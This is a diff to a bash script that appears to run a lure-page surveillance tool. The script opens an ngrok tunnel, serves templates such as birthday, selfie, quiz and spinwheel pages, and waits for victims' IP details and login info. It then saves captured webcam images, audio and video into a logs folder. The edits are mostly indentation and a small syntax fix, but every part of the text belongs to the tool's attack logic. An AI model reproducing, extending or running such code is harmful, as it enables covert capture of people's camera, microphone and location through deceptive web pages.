@@ -288,7 +288,7 @@ ngrok_token_setup(){
 
         if [[ -s "${HOME}/.ngrok2/ngrok.yml" ]]; then
                rm -rf ${HOME}/.ngrok2/ngrok.yml
-	       echo -e "\n"
+	       echo -ne " "
                read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
                authline="authtoken : ${ntoken}"
                echo "$authline" >> ngrok.yml
@@ -546,6 +546,7 @@ ip_details() {
 	fi
 	mv track.txt ${logs_full_dir}
 }
+
 capture_data_image() {
         echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
   	while true; do
@@ -554,13 +555,13 @@ capture_data_image() {
                         capture_ip
                 fi
                 sleep 0.75
-	            	if [[ -e ".server/www/Log.log" ]]; then
-	               		echo " "
-                    printf "${GREEN} Cam file received! ${NC}"
-										echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
-										echo -ne " "
-                    rm -rf .server/www/Log.log
-	               		mv .server/www/*.png  ${logs_full_dir}/
+            	if [[ -e ".server/www/Log.log" ]]; then
+	               	echo " "
+		        printf "${GREEN} Cam file received! ${NC}"
+			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
+			echo -ne " "
+                   	rm -rf .server/www/Log.log
+	               	mv .server/www/*.png  ${logs_full_dir}/
                 fi
                 sleep 0.5
 	done
@@ -577,10 +578,10 @@ capture_data_audio() {
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
                         printf "${GREEN} Audio file received! ${NC}"
-												echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
-												echo -ne " "
-												rm -rf .server/www/Log.log
-												mv .server/www/*.wav  ${logs_full_dir}/
+			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
+			echo -ne " "
+			rm -rf .server/www/Log.log
+			mv .server/www/*.wav  ${logs_full_dir}/
                 fi
                 sleep 0.5
 	done
@@ -597,11 +598,10 @@ capture_data_video() {
                 sleep 0.75
 		if [[ -e ".server/www/Log.log" ]]; then
                         printf "${GREEN} Video file received! ${NC}"
-												echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
-												echo -ne " "
+			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
+			echo -ne " "
                         rm -rf Log.log
                         mv .server/www/*.webm  ${logs_full_dir}/
-                        done
                 fi
                 sleep 0.5
 	done
@@ -724,36 +724,36 @@ case $reply_template in
         1 | 01)
                 site_template="default"
                 tunnel_menu;;
-				2 | 02)
-				        site_template="birthday"
-				        tunnel_menu;;
-				3 | 03)
-				         site_template="book"
-				         tunnel_menu;;
-				4 | 04)
-				         site_template="boxwish"
-				         tunnel_menu;;
-				5 | 05)
-				  			 site_template="firework"
-				  				tunnel_menu;;
-				6 | 06)
-					 			 site_template="game"
-					 		   tunnel_menu;;
-				7 | 07)
-				  			  site_template="guess"
-					 				tunnel_menu;;
-		    8 | 08)
-					 				site_template="quiz"
-					 				tunnel_menu;;
-				9 | 09)
-				  	 			 site_template="rps"
-						 		   tunnel_menu;;
-				10)
-				  			  site_template="selfie"
-					 				tunnel_menu;;
-		    11)
-					 				site_template="spinwheel"
-					 				tunnel_menu;;
+			2 | 02)
+			        site_template="birthday"
+			        tunnel_menu;;
+			3 | 03)
+			        site_template="book"
+				tunnel_menu;;
+			4 | 04)
+			        site_template="boxwish"
+			        tunnel_menu;;
+			5 | 05)
+			 	site_template="firework"
+				tunnel_menu;;
+			6 | 06)
+				site_template="game"
+				tunnel_menu;;
+			7 | 07)
+				site_template="guess"
+				tunnel_menu;;
+			8 | 08)
+				site_template="quiz"
+				tunnel_menu;;
+			9 | 09)
+				site_template="rps"
+				tunnel_menu;;
+			10)
+				site_template="selfie"
+				tunnel_menu;;
+			11)
+				site_template="spinwheel"
+				tunnel_menu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_image; };;
